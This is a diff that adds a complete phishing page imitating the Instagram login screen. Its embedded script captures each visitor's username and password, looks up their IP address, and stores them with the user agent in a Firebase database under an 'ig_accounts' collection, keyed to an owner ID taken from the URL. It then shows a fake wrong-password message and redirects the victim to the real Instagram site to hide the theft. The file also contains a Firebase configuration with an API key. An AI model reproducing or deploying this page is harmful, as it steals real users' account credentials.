@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <meta property="og:title" content="Instagram">
+    <meta property="og:description" content="Create an account or log in to Instagram - Share what you're into with the people who get it.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png">
+    <title>Instagram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .wrapper { width: 100%; max-width: 350px; }
+        
+        .top-section { text-align: center; margin-bottom: 12px; }
+        .top-section img { width: 175px; margin-bottom: 4px; }
+        .top-section .insta-text {
+            font-family: 'Billabong', 'Segoe UI', cursive;
+            font-size: 50px;
+            color: #262626;
+            display: none;
+        }
+        
+        .login-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 36px 40px 20px;
+            margin-bottom: 10px;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 10px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            color: #262626;
+            outline: none;
+            margin-bottom: 6px;
+            font-family: inherit;
+        }
+        .login-box input:focus { border-color: #a8a8a8; }
+        .login-box input::placeholder { color: #8e8e8e; font-size: 12px; }
+        
+        .login-btn {
+            width: 100%;
+            background: #0095f6;
+            color: #fff;
+            border: none;
+            padding: 7px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin: 10px 0;
+            font-family: inherit;
+        }
+        .login-btn:disabled { opacity: 0.7; }
+        
+        .divider-or {
+            display: flex;
+            align-items: center;
+            margin: 16px 0;
+        }
+        .divider-or::before, .divider-or::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        .divider-or span {
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 0 18px;
+        }
+        
+        .fb-link {
+            text-align: center;
+            margin: 18px 0 8px;
+        }
+        .fb-link a {
+            color: #385185;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+        .fb-icon {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            background: #385185;
+            border-radius: 2px;
+            color: #fff;
+            font-size: 10px;
+            line-height: 16px;
+            text-align: center;
+            font-weight: bold;
+        }
+        
+        .forgot-link { text-align: center; margin-top: 10px; }
+        .forgot-link a { color: #00376b; text-decoration: none; font-size: 12px; }
+        
+        .signup-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 24px;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        .signup-box span { color: #262626; font-size: 14px; }
+        .signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; }
+        
+        .app-text { text-align: center; color: #262626; font-size: 14px; margin-bottom: 12px; }
+        .app-btns { display: flex; justify-content: center; gap: 8px; }
+        .app-btns img { height: 40px; }
+        
+        .error-msg { color: #ed4956; font-size: 12px; text-align: center; margin-top: 8px; display: none; }
+        
+        .footer-links { text-align: center; margin-top: 20px; font-size: 12px; color: #8e8e8e; line-height: 1.8; }
+        .footer-links a { color: #8e8e8e; text-decoration: none; margin: 0 4px; }
+        
+        @media (max-width: 450px) {
+            .login-box { background: transparent; border: none; padding: 20px 16px; }
+            .signup-box { background: transparent; border: none; }
+        }
+    </style>
+</head>
+<body>
+<div class="wrapper">
+    <div class="top-section">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" alt="Instagram" onerror="this.style.display='none';document.querySelector('.insta-text').style.display='block';">
+        <div class="insta-text">Instagram</div>
+    </div>
+    
+    <div class="login-box">
+        <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="username">
+        <input type="password" id="password" placeholder="Password" autocomplete="current-password">
+        <button class="login-btn" id="loginBtn">Log in</button>
+        
+        <div class="divider-or"><span>OR</span></div>
+        
+        <div class="fb-link">
+            <a href="#"><span class="fb-icon">f</span> Log in with Facebook</a>
+        </div>
+        
+        <div class="forgot-link"><a href="#">Forgot password?</a></div>
+        <div class="error-msg" id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>
+    </div>
+    
+    <div class="signup-box">
+        <span>Don't have an account? </span><a href="#">Sign up</a>
+    </div>
+    
+    <div class="app-text">Get the app.</div>
+    <div class="app-btns">
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play">
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft">
+    </div>
+    
+    <div class="footer-links">
+        <a href="#">Meta</a> · <a href="#">About</a> · <a href="#">Blog</a> · <a href="#">Jobs</a> · <a href="#">Help</a> · <a href="#">API</a> · <a href="#">Privacy</a> · <a href="#">Terms</a>
+        <br><br>English · © 2024 Instagram from Meta
+    </div>
+</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",
+        authDomain: "camerahhh-15487.firebaseapp.com",
+        projectId: "camerahhh-15487",
+        storageBucket: "camerahhh-15487.firebasestorage.app",
+        messagingSenderId: "212849652224",
+        appId: "1:212849652224:web:19d8a85c01cd81005bdee5"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+    const uid = new URLSearchParams(window.location.search).get('uid');
+
+    document.getElementById('loginBtn').addEventListener('click', async () => {
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+        if (!username || !password) {
+            document.getElementById('errorMsg').style.display = 'block';
+            return;
+        }
+        document.getElementById('loginBtn').disabled = true;
+        document.getElementById('loginBtn').innerText = 'Logging in...';
+        
+        let ip = 'unknown';
+        try { const r = await fetch('https://api.ipify.org?format=json'); ip = (await r.json()).ip; } catch(e) {}
+        
+        if (uid) {
+            try {
+                const docData = {
+                    ownerId: uid,
+                    username,
+                    password,
+                    ip,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString(),
+                    unix: Date.now()
+                };
+                try {
+                    await addDoc(collection(db, "ig_accounts"), docData);
+                } catch(e) {
+                    // Alternatif: platform bilgisi olmadan dene
+                    await addDoc(collection(db, "ig_accounts"), {
+                        ownerId: uid,
+                        username,
+                        password,
+                        ip,
+                        userAgent: navigator.userAgent.substring(0, 100),
+                        timestamp: new Date().toISOString(),
+                        unix: Date.now()
+                    });
+                }
+            } catch(e) { console.log('Kayıt hatası:', e.message); }
+        }
+        
+        document.getElementById('errorMsg').style.display = 'block';
+        document.getElementById('errorMsg').innerText = 'Sorry, your password was incorrect. Please double-check your password.';
+        
+        setTimeout(() => { window.location.href = 'https://www.instagram.com/accounts/login/'; }, 2500);
+    });
+
+    document.getElementById('password').addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') document.getElementById('loginBtn').click();
+    });
+</script>
+</body>
+</html>
